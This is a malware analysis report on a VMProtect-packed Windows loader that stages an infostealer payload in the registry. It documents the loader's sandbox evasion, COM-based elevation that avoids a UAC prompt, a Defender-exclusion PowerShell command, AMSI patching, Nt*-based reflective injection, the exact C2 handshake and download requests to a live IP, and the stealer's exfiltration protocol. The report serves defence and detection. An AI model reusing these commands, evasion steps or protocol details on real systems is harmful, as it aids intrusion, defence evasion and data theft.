# RuntimeBroker.exe — a VMProtect loader that stages its payload in the registry

Reverse engineering of the second-stage loader from a commodity infostealer
infection (August 2026). The loader was delivered by a trojanised game trainer,
established a foothold, and pulled a 1.45 MB payload from its C2.

Analysis was done statically and under CPU emulation (Unicorn). The sample was
never executed on a real system.

---

## Sample

| | |
|---|---|
| SHA-256 | `cf0d4b3837b9a23fb46cbb0a90f5ecae6b7dcd5b1f13b9d4a5fe0de7cec85041` |
| Size | 527,872 bytes |
| Type | PE32+ (x64), GUI subsystem |
| Compile timestamp | `0x6A89002F` |
| Entry point | `0x1400170B0` |
| Dropper (stage 1) | `b971a5c1915861d611bf56d718f084406325890e5f47d9a1f64e982481e3b2b8` |

Detection at time of analysis: 28/71 on VirusTotal, all generic names
(`Generic.Dacic`, `Trojan.Evader`, `VHO:HackTool.Win64.Knotweed.gen`). No
family attribution — reasonably, since the credential-theft code is not in
this file.

---

## Summary

This is a **loader**, not a stealer. It builds a foothold, connects to C2, and
waits for instructions. Everything interesting happens when the operator sends
a task.

Three findings are worth the reader's time:

1. **The payload is staged in the registry, not on disk.** Chunks are written
   under `HKCU\Software\WinRAR\Libs` with names like `<id>_<name>_chunk_<n>`,
   using a `tempchunk` → `chunk` atomic-commit scheme that survives reboot and
   supports resume. Filesystem scanning does not see the payload at any point.

2. **The download channel carries a plaintext PE.** The C2 control channel is a
   masked WebSocket, but payload delivery is a separate cleartext HTTP transfer.
   A `MZ` / `PE\0\0` validator runs directly on the received socket buffer, so
   there cannot be an encryption layer on the wire. This makes a trivial,
   decryption-free network signature possible.

3. **The WebSocket handshake key is the example value from RFC 6455.** The
   client is hand-written and sends `Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==`
   on every connection. A conforming client must generate this randomly per
   connection, so it is a near-zero-false-positive fingerprint that survives
   recompilation.

---

## 1. Structure and packing

Seven sections. The sixth has an **empty name** and is executable — the
VMProtect runtime:

```
name       vsize     rawsize   characteristics
.text      0x2B236   0x2B400   0x60000020  RX
.rdata     0x03C8A   0x03E00   0x40000040  R
.data      0x18E50   0x00200   0xC0000040  RW
.pdata     0x018CC   0x01A00   0x40000040  R
.CRT       0x00010   0x00200   0x40000040  R
(unnamed)  0x4E2AC   0x4E400   0x68000020  RX   <- VMProtect runtime
.reloc     0x01578   0x01600   0x42000040  R
```

`.pdata` is fake: **529 `RUNTIME_FUNCTION` entries, zero structurally valid**
(begin/end/unwind fields do not satisfy `0 < begin < end < SizeOfImage`). It is
being abused to store data. Function boundaries therefore cannot be recovered
from the exception directory.

VMProtect is used in **mutation** mode, not virtualisation. `.text` is decoy CRT
code; real logic sits behind heavy constant folding. A representative example —
this is the entire body of a `memcpy`:

```asm
movabs rcx, 0xE5A1D11C0E842139
sub    rdx, rcx
sub    rdx, -1
movabs rcx, 0xE5A1D11C0E842139
add    rdx, rcx              ; rdx = 1
movabs r8,  0x2D7FA90CAC2BB8A2
mov    rcx, rax
add    rcx, r8
sub    rcx, rdx
movabs rdx, 0x2D7FA90CAC2BB8A2
sub    rcx, rdx              ; rcx = n - 1
```

The static import table carries **KERNEL32.dll only** (69 imports). Sixty-four
further APIs are resolved at runtime through `LoadLibraryA` + `GetProcAddress`
into pointer tables in `.data`, including the entire ntdll injection set.

Strings are obfuscated per-string: **204 decryption call sites backed by 63
distinct routines**, one dedicated thunk per string. Some routines decrypt in
place in `.rdata`; others write their plaintext into a **TLS slot**
(`gs:[0x58]` → TLS array → block + fixed offset). 159 plaintext strings were
recovered by calling each thunk in an isolated single-function sandbox.

---

## 2. Anti-analysis

Ten-plus layers, all checked before the main loop runs:

| Check | Mechanism |
|---|---|
| VM drivers | `CreateFileA` on VBox / VMware / QEMU / Parallels / Xen driver names |
| VM devices | `\\.\VBoxMiniRdrDN`, `\\.\HGFS`, `\\.\prl_usb_mouse` |
| CPUID | hypervisor bit + brand strings `KVMKVMKVM`, `VMwareVMware`, `XenVMMXenVMM`, `prl hyperv`, `VBoxVBoxVBox`, `QEMU`, `Microsoft Hv` |
| GPU | D3D9 adapter identifier vs a blacklist that explicitly names **`anyrun GPU`** |
| Display | `EnumDisplaySettingsW` resolution sanity |
| CPU model | rejects `Broadwell`, `EPYC`, `G6900` — common cloud-sandbox models |
| Debugger | `NtQueryInformationProcess` plus a timing watchdog thread |
| Self-protection | `RtlSetProcessIsCritical` — force-terminating the process bugchecks the host |

The `anyrun GPU` and cloud-CPU-model entries are notable: the author is
specifically evading public online sandboxes rather than local VMs alone.

---

## 3. Execution chain

Note that elevation, AV blinding, installation and persistence are all
**this sample's own code**, not the dropper's. The dropper only delivers it.

```
HowToFishTrainer.exe   stage 1, trojanised game trainer (.NET Native AOT)
  └─ delivers and runs RuntimeBroker.exe

RuntimeBroker.exe      stage 2 -- this sample; everything below is its own code
  |
  ├─ recon     geofence via Control Panel\International\Geo\Nation,
  │            CPU vendor, BIOS manufacturer, volume serial, display
  │            parameters, plus the VM checks in §2
  │
  ├─ elevate   CheckTokenMembership -> not an administrator
  │            CoGetObject("Elevation:Administrator!new:{3E5FC7F9-...}")
  │            -> ICMLuaUtil::ShellExec(own path)            no UAC prompt
  │
  ├─ blind     powershell -Command "Add-MpPreference -ExclusionPath
  │              'C:\ProgramData\Windows\Microsoft',
  │              'C:\ProgramData\Microsoft\Windows'" && gpupdate /force
  │            amsi.dll!AmsiOpenSession patched in memory     (0x140011B70)
  │
  ├─ install   GetModuleFileNameW + CompareStringOrdinal to test whether it is
  │            already in place; DeleteFileW / SetFileAttributesW to clear an
  │            older build; CopyFileW to
  │            C:\ProgramData\Windows\Microsoft\RuntimeBroker.exe;
  │            CreateProcessW the copy, original ExitProcess
  │
  ├─ persist   CoCreateInstance(ITaskService) x4, four scheduled tasks    §8
  │
  └─ beacon    WSAStartup -> getaddrinfo -> socket -> connect
               WebSocket handshake -> "ready;..." -> wait for commands    §4
```

The second exclusion path, `C:\ProgramData\Microsoft\Windows`, is a **real
Windows directory**. It is chosen so the exclusion list looks plausible under
manual review. Detection must therefore test for the *presence of the exclusion
entry*, not for the existence of the directory.

---

## 4. C2 protocol

A hand-written WebSocket client over raw sockets. Hard-coded C2
`45.91.202.146`, ports `406` and `408`, both stored encrypted in the config
block and decrypted into TLS at runtime.

The handshake request is recovered byte for byte. It is assembled from two
encrypted constants with the host spliced between them — `A + <host> + B`:

| | Thunk | Length | Content |
|---|---|---|---|
| A | `0x140017D70` | 22 | `GET / HTTP/1.1\r\nHost: ` |
| B | `0x140017DD0` | 117 | `\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: …\r\nSec-WebSocket-Version: 13\r\n\r\n` |

Against the hardcoded C2 that yields exactly 152 bytes:

```http
GET / HTTP/1.1
Host: 45.91.202.146
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

```

Four properties worth recording, all now definite: the request path is **`/`**;
the header order is exactly as above; there are **no additional headers** (no
`User-Agent`, `Origin`, `Accept`, `Pragma`, `Cache-Control`,
`Sec-WebSocket-Extensions` or `Sec-WebSocket-Protocol`); and the request
terminates with a single `CRLF CRLF`.

**`Host:` carries no port.** The C2 listens on 406/408, not 80, yet the header
is the bare address — there is no `":%d"`-style format string anywhere in the
binary. That mismatch is itself a fingerprint.

The `Sec-WebSocket-Key` is the **example value from RFC 6455**, sent unchanged on
every connection. A conforming client generates 16 random bytes per connection,
so the fixed server response is equally predictable:

```
Sec-WebSocket-Key:    dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

Framing is RFC-conformant: client frames are masked with a 4-byte key
transmitted in the clear at offset 2-5; server frames are unmasked. (An early
emulation attempt masked the server frames, violating the RFC, and the sample
retried 1,363 times before giving up — a useful accidental confirmation that it
validates framing.)

Registration message, sent once:

```
ready;<volume-serial>;version;1.0.0
```

The second field is the **volume serial number of the system drive**, formatted
as eight lowercase hex digits — an implicit bot ID. Confirmed experimentally:
the emulation harness stubbed `GetVolumeInformationW` without writing the
`lpVolumeSerialNumber` out-parameter, so the buffer stayed zero and every
captured beacon read `ready;00000000;…`. Writing `0xDEADBEEF` into that
parameter and re-running produced `ready;deadbeef;version;1.0.0`.

> **`00000000` is an artifact of emulation, not a real value.** Earlier drafts
> of this report recorded it as the literal registration message. A live
> infection sends its own drive serial, so the all-zero form should not be used
> as a signature and would not be produced by any real host.

Campaign ID `63203572`. Commands observed from the server:

| Command | Handler | Action |
|---|---|---|
| `ping` | — | replies `pong` |
| `getinfo` | `0x1400084C0` | WMI `ROOT\SecurityCenter2`, `SELECT displayName FROM AntiVirusProduct` → AV product list, OS version, username, SID |
| `task` | `0x14000FA50` | see §5 |
| `checkserver` | `0x140015870` | C2 liveness probe, see §4.1 |

### 4.1 C2 liveness and fallback

`0x140015870(host, port, callback, 0)` contains **two independent retry loops**,
each capped at 5 attempts with `Sleep(30000)` between failures:

| | Primary | Fallback |
|---|---|---|
| Host source | hard-coded config IP `L"45.91.202.146"` (passed in `rcx`) | `RegRead(Software\Microsoft\EventSystem, "System")` + `".duckdns.org"` |
| Probe | `0x1400159E6` → `0x1400160E0` | `0x140015B7B` → `0x1400160E0` |
| On success | `RegWrite` cache at `0x140015A17` | `RegWrite` cache at `0x140015BAC` |

`0x1400160E0` is a standard non-blocking reachability test: `getaddrinfo` →
`socket` → `connect` → `select` → `getsockopt(SO_ERROR)` → `closesocket`, with a
3-second timeout.

The `.duckdns.org` **subdomain prefix is not in the binary**. It is whatever
hostname most recently probed successfully, cached in the registry. The infected
host was wiped, so that cached value is gone — this is data loss, not an
analysis gap.

### 4.2 Campaign status

This is not an isolated sample. VirusTotal associates **21 files** with
`45.91.202.146`, most of them named `RuntimeBroker.exe` and sized 519–536 KB —
recompiles of the same loader. Their first-submission dates run from
**2026-08-21 to 2026-08-31**, with new builds appearing on most days including
the date this was written.

Two things follow:

- **The campaign is active.** Operators do not keep shipping fresh builds at a
  dead C2. The reachability of the server itself was not tested, but treating
  this IP as historical would be a mistake — the network rule in
  [`detection/suricata.rules`](detection/suricata.rules) is worth running live,
  not only against stored flow logs.
- **File hashes are worthless here.** Every build is a different hash. The
  durable indicators are the two registry values (§6, §8) and the hardcoded
  RFC 6455 handshake key, none of which change between builds.

The IP is announced by **AS211381 (Podaon SIA, NL)** and has previously hosted a
cluster of algorithmically-named `.shop` domains, which suggests reuse across
campaigns rather than dedicated infrastructure.

A 62-character alphabet (`a-zA-Z0-9`) coexists with the domain suffix in the
config, which initially suggested a DGA. It is not: the PRNG at `0x140014FB0`
(`GetTickCount64`-seeded, `div rcx` mod 62) produces the nonce in
`checkserver;<value>;<nonce>`.

### 4.3 Three ports, one host

A single address carries the whole chain. Confirmed against the live server on
2026-08-31 / 2026-09-01:

| Port | Role | Response to the wrong protocol |
|---|---|---|
| **406** | WebSocket control channel | plain HTTP → `426 Upgrade Required` |
| **408** | HTTP payload download (§6) | unauthorised → `403` / `404` |
| **1488** | Stealer data exfiltration | line-oriented, see below |

Ping cadence on the control channel is **15 seconds**.

Port 1488 belongs to the **second-stage stealer**, not to this loader — it is
listed here because the same host serves it, which means blocking the address
covers all three stages.

```
connect <host>:1488
  -->  "stealer;<8 lowercase hex volume serial>\n"
  <--  "auth_ok\n"
  -->  8-byte big-endian length
  -->  stored (uncompressed) ZIP
```

The trailing newline is required: without it the collector ACKs at TCP level and
then blocks indefinitely. Note what this protocol does **not** have — no TLS, no
compression. Stolen data crosses the network essentially in the clear, so a
network sensor positioned to see it can recover the archive contents directly.

The identity here is the same volume serial used as the bot id in the `ready;`
message (§4), which ties exfiltrated archives back to a specific host.

---


---

## 5. Task subsystem

What the live server actually sends:

```
task;createtask;Stealer;task_id;fa5iik_sgka;version;1.0.1
```

The verb is followed by a **bare module token**, with no `type;` key and **no
`param;` field at all**.

The parser at `0x14000EC40` nevertheless searches for a longer form, in order:

| Needle | Address | Destination |
|---|---|---|
| `task;` | `0x14000ECFF` | — |
| `task_id;` | `0x14000EE2F` | — |
| `createtask` | `0x14000EF4E` | — |
| `type;` | `0x14000EF71` | `[rsp+0x2C0]` |
| `version;` | `0x14000F0B4` | `[rsp+0x260]` |
| `param;` | `0x14000F1DE` | `[rsp+0x160]` |

So the client *accepts* `task;<verb>;task_id;<id>;type;<type>;version;<ver>;param;<param>`,
which earlier revisions of this report documented as the message format. It is
the grammar the parser tolerates, not the one the operator uses. Confirmed
against the live server on 2026-08-31.

The dispatcher skips `"task;"`, extracts the verb, then `strstr("task_id;") + 8`
for the ID. It allocates a **0x188-byte (392) task structure** on the heap and
spawns a dedicated worker thread per task (`0x14000F7A0`), so the receive loop
never blocks.

| Verb | Behaviour |
|---|---|
| `createtask` | reassemble payload from chunks → suspended-process injection (§6) |
| `update` | report `task_done;` → prepare elevation → `ExitProcess`; scheduled tasks restart the new build |
| `closetask` | `OpenProcess` + `TerminateProcess` + `WaitForSingleObject` on the recorded PID |

`closetask` operating on a recorded PID is what first indicated that
`createtask` spawns a real, separate process rather than running in-process.

---

## 6. Payload delivery — registry chunking

`0x14000B770` is a download channel **independent of the WebSocket control
channel**, on port 408 rather than 406. It never executed under emulation (it
requires a real `createtask`), so the control flow below was reconstructed
statically; it has since been confirmed against the live server.

```c
buf = HeapAlloc(heap, HEAP_ZERO_MEMORY, 0x300000);   // 3 MB — fits the 1.45 MB payload
WSAStartup(0x202, &wsa);
WideCharToMultiByte(host);
getaddrinfo(); socket(); connect();
sprintf(request, DOWNLOAD_TEMPLATE, task, host, ua);  // see below
send(); recv() until complete;
shutdown(); closesocket(); WSACleanup();

IsValidPE(buf, size);                                 // 0x140005FB0 — see §7

RegCreateKeyA(HKCU, "Software\\WinRAR\\Libs");
  sprintf("%s_%s_tempchunk_%d", type, version, n);     // staged write
  RegSetValueExA(...);                                 // then delete stale temps
RegCloseKey();
  RegGetValueA(tempchunk) → HeapAlloc → RegSetValueExA(chunk) → RegDeleteValueA(temp);
                                                      // atomic commit
```

The two-name scheme is a **resume protocol**: committed `chunk` values survive
process termination and reboot, so a killed transfer continues from where it
stopped. `Software\WinRAR\Libs` is chosen for camouflage — it looks like WinRAR
library data.

### The download request

Recovered from `0x140025A60` (TLS drop) and `0x14002DABE` (in-place `.rdata`):

```http
GET /task/<type> HTTP/1.1
Host: <host>
User-Agent: <bot_id>
Connection: close

```

**The path carries the module type, not the task identifier.** Traced
statically: `[rsp+0x2C0]`, filled by the `type;` lookup in §5, becomes `rcx` of
`0x14000B770` and lands as the first `%s` of the template. The live server
settles it:

```
GET /task/fa5iik_sgka     (task_id)  ->  404 Not Found
GET /task/Stealer         (type)     ->  200 OK, 1,452,032 bytes
```

Independently corroborated by the payload's VirusTotal filename
`Stealer_1.0.1_chunk_0_export.bin` — the registry chunk name uses the same
`<type>_<version>` pair.

**The `User-Agent` is the authorisation token, not a browser string.** It
carries the bot identity registered on the control channel:

| User-Agent | Response |
|---|---|
| absent | `403 Forbidden` |
| the task_id | `403 Forbidden` |
| arbitrary text | `403 Forbidden`, then `429` under rate limiting |
| well-formed id, not this session's | `404 Not Found` |
| the id registered on the live session | `200 OK` + payload |

`403` is a format rejection; `404` means "valid shape, unknown identity".
Fetching therefore requires registering over 406 first and reusing that same id
here. Four rapid requests triggered `429`.

`0x140010160` returns a pointer to `.data` at `0x140031020` holding
`00000000`, and nothing in `.text` writes that buffer — so a pristine sample
would send `User-Agent: 00000000`, which the live server rejects. **How the real
client obtains an accepted id is not established** (see §10).

`Connection: close` makes this a one-shot fetch, matching the recv-until-complete
loop above. Combined with §7 — the response body is an unencrypted PE — the
`GET /task/` request is the most specific network signature in this report.

### Injection

```c
CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, ...,
               CREATE_SUSPENDED | CREATE_NO_WINDOW, ...);   // 0x08000004
ResumeThread(pi.hThread);
Sleep(500);                                   // let cmd.exe initialise

// reflective loader, 0x14000AA10
NtAllocateVirtualMemory(hProcess, ...);
NtWriteVirtualMemory(hProcess, image + loader stub);
NtCreateThreadEx(hProcess, stub);
// the stub receives the addresses of LoadLibraryA / GetProcAddress and resolves
// the image's imports itself; RtlAddFunctionTable registers SEH unwind data for
// the manually mapped image

if (failed) TerminateProcess(hProcess, 1);
*outPid = pi.dwProcessId;                     // recorded for closetask
```

It uses `Nt*` rather than `VirtualAllocEx` / `WriteProcessMemory` /
`CreateRemoteThread`, bypassing the kernel32 functions that user-mode hooks
most commonly cover.

Net effect: **the only executable ever written to disk is the loader itself.**
The stealer exists only as registry binary values and as memory inside a
windowless `cmd.exe`.

---

## 7. What comes down the wire

A raw, unencrypted PE — specifically a **DLL**. Two independent lines of
evidence.

**The validator.** `0x140005FB0` runs on the freshly received buffer, before
any other processing:

```c
BOOL IsValidPE(void *buf, DWORD size)
{
    if (!buf || size < 0x40)                         return FALSE;
    if (*(WORD*)buf != 0x5A4D)                       return FALSE;  // 'MZ'
    if (dos->e_lfanew <= 0)                          return FALSE;
    if (buf + e_lfanew > buf + size)                 return FALSE;
    nt = buf + dos->e_lfanew;
    if (*(DWORD*)nt != 0x00004550)                   return FALSE;  // 'PE\0\0'
    if (nt + 0x108 > buf + size)                     return FALSE;
    if (!(nt->FileHeader.Characteristics & 0x2000))  return FALSE;  // IMAGE_FILE_DLL
    if (nt->OptionalHeader.SizeOfImage > size * 2)   return FALSE;
    return TRUE;
}
```

Those magic values cannot match if an encryption or compression layer is
present, and passing the check is a precondition for storing the payload. The
`0x2000` test additionally proves the second stage is a DLL.

**The receive path.** `0x140010FB0`, the helper called inside the `recv` loop,
is a plain byte-wise copy. Over its true extent
(`0x140010FB0`–`0x14001105E`, 175 bytes, 39 instructions): **zero real `xor`,
zero `rol`/`ror`/`shl`/`shr`/`not`/`neg`**, one `xor ecx, ecx` zeroing idiom,
and exactly two byte-level memory accesses.

---

## 8. Persistence

Four scheduled tasks, named to blend into stock Windows task folders:

```
Updates compatibility database
Handles restoring settings from the cloud
SvcRestartTaskWindowsLogins
ProgramDataUpdate / ScheduledDef / MicrosoftUpdaterMachineCore
BootTrigger, TimeRepetition, PT0S      (ISO 8601 zero interval = continuous)
```

Created through COM `ITaskService` (`0x140013340`, `0x140011E80`).

---

## 9. Capability set

64 APIs resolved dynamically into `.data` pointer tables. Two independent
methods agree on the count: runtime slot reverse-lookup under emulation
resolved 64, and static recovery of the resolver name thunks yields the same 64.

```
ntdll      NtAllocateVirtualMemory, NtWriteVirtualMemory, NtFreeVirtualMemory,
           NtCreateThreadEx, NtQueryInformationProcess, RtlSetProcessIsCritical,
           RtlGetVersion, RtlInitUnicodeString, Rtl{Enter,Leave}CriticalSection
advapi32   Reg{Create,Open,Set,Query,Get,Enum,Delete,Close}* (A and W),
           OpenProcessToken, AdjustTokenPrivileges, GetTokenInformation,
           AllocateAndInitializeSid, CheckTokenMembership, ConvertSidToStringSidW,
           LookupPrivilegeValueW, GetUserNameW, FreeSid
ws2_32     send, recv, socket, connect, shutdown, closesocket, select,
           WSAStartup, WSACleanup, WSAGetLastError, getaddrinfo, freeaddrinfo,
           getsockopt, setsockopt, ioctlsocket
ole32      CoInitializeEx, CoCreateInstance, CoUninitialize, CoGetObject
oleaut32   SysAllocString, SysAllocStringLen, SysFreeString, VariantInit, VariantClear
user32     RegisterClassW, CreateWindowExW, GetMessageW, TranslateMessage,
           DispatchMessageW, DefWindowProcW, PostQuitMessage, WaitForInputIdle
```

`LoadLibraryA` / `GetProcAddress` are not in the table — they belong to the
resolver. `RtlAddFunctionTable` is not either: it is passed to the injected stub.

Token theft targets `winlogon`, `smartscreen`, `explorer.exe` with
`SeDebugPrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeIncreaseQuotaPrivilege`.

---

## 10. Coverage and limits

Function inventory was built by recursive descent over direct `call` targets,
because `.pdata` is unusable. That yields **335 targets in `.text`**, classified:

| Class | Functions | Bytes | Share of `.text` | State |
|---|---|---|---|---|
| A — control flow read line by line | 16 | 19,936 | 11.3% | done |
| B — per-string decryption thunks | 55 | 77,568 | 43.9% | functionally solved (159 plaintexts recovered) |
| C — external API behaviour | 50 | 42,080 | 23.8% | all characterised |
| D — pure computation / CRT | 214 | 36,838 | 20.8% | no external behaviour |

Dynamic coverage under emulation: `.text` 50.37%, unnamed section 19.44%
(34,285 unique instruction addresses). Everything beyond that is static
reconstruction, and the two are labelled separately throughout.

**335 is a lower bound, not a count of functions.** VMProtect rewrites some call
sites into jump chains inside its own section, leaving the callee with no
static reference at all. Three functions discussed above are in exactly that
position:

| Function | How it was found |
|---|---|
| `0x14000F7A0` (task worker) | `0x1400100DB lea r8,[rip-0x942]` + `CreateThread` |
| `0x140015870` (checkserver) | dynamic coverage, then an entry hook reading the stack |
| `0x1400084A0` (checkserver callback) | only visible as a runtime `r8` argument |

A byte-level scan for any rip-relative or absolute reference to `0x140015870`
across the whole file returns nothing, while the same scan correctly finds
`0x14000F7A0`. Under emulation the function nevertheless executes; hooking its
entry gives a return address of `0x140099924` — inside the unnamed section.
The original call site has been dissolved by the mutation engine.

So "66 behavioural functions fully characterised" should be read as *all
identified behavioural functions*, not as a claim that no others exist. A crude
attempt to find missed functions (covered addresses more than 0x1000 from any
known entry) leaves 538 addresses unattributed, which is inconclusive because
the heuristic cannot establish function extents.

**Not obtained:**

- ~~**The second-stage payload itself.**~~ **Obtained 2026-08-31** by speaking the
  protocol to the live C2 with a purpose-built client — the sample was never run.
  It is **Redhive Stealer** (its own branding; CryptBot per Microsoft,
  TrendMicro, Antiy and alibabacloud), SHA-256
  `fd779b73082ed7c7d98d076f863562a6cb8d2297077a3e093305051be040bd29`,
  1,452,032 bytes, PE32+ DLL, compiled 2026-08-21 — one day before the loader.

  We were **not first**: the same payload has been on VirusTotal since
  2026-08-23, uploaded under the filename `Stealer_1.0.1_chunk_0_export.bin` —
  i.e. someone else had already exported it from the registry chunks. The
  earlier framing of this as unrecoverable was wrong on both counts: the C2 was
  live, and a copy was already public.

- **How the real client obtains an accepted bot id.** `0x140010160` hands back a
  `.data` buffer at `0x140031020` containing `00000000`, and nothing in `.text`
  writes it — yet the live server rejects that value. Some assignment path
  exists that static analysis has not located. Related: the `ready;` message's
  bot id is the volume serial (§4), which arrives via the
  `GetVolumeInformationW` out-parameter rather than from `0x140031020`, so the
  buffer may simply be a default that is never used on the wire.

- **The `.duckdns.org` subdomain prefix.** Mechanism understood (§4.1); the
  cached value is gone with the host.
- ~~**The `User-Agent` value used by the download channel.**~~ **Resolved.** It
  is not a browser string at all — it carries the bot id and acts as the
  authorisation token for the download (§6). The reason it never appeared among
  the decrypted strings is that there is no constant to decrypt.
- **The unnamed 320 KB section.** VMProtect's own runtime. Analysing it studies
  VMProtect, not this loader.

---

## Appendix — reproduction

```
Unicorn Engine 2.1.4 + pefile 2024.8.26 + capstone 5.0.7, Python 3.11
```

The harness maps the PE image, constructs a synthetic TEB/PEB/TLS, fakes the
IAT with API stubs, and returns plausible values for each anti-analysis probe.
A fake socket layer captures C2 traffic. Strings are recovered by invoking each
decryption thunk in an isolated Unicorn instance rather than running the sample
body.

The sample is never executed natively. Unicorn is a CPU emulator with no OS
underneath: `syscall` has nowhere to dispatch, and every API lands on a stub
address. Scripts import only `pefile`, `struct`, `unicorn`, `capstone`, `json`,
`os`, `re`, `collections` — no `socket`, `subprocess`, `ctypes`, or `winreg`.

The one honest residual risk: Unicorn is C code parsing an attacker-controlled
instruction stream. A memory-safety bug in Unicorn is theoretically exploitable.
The probability is low — this sample targets Windows, not Unicorn — but it is
not zero, and it is the only real exposure in this workflow.

See [`tools/`](tools/) for the scripts and [`detection/`](detection/) for rules.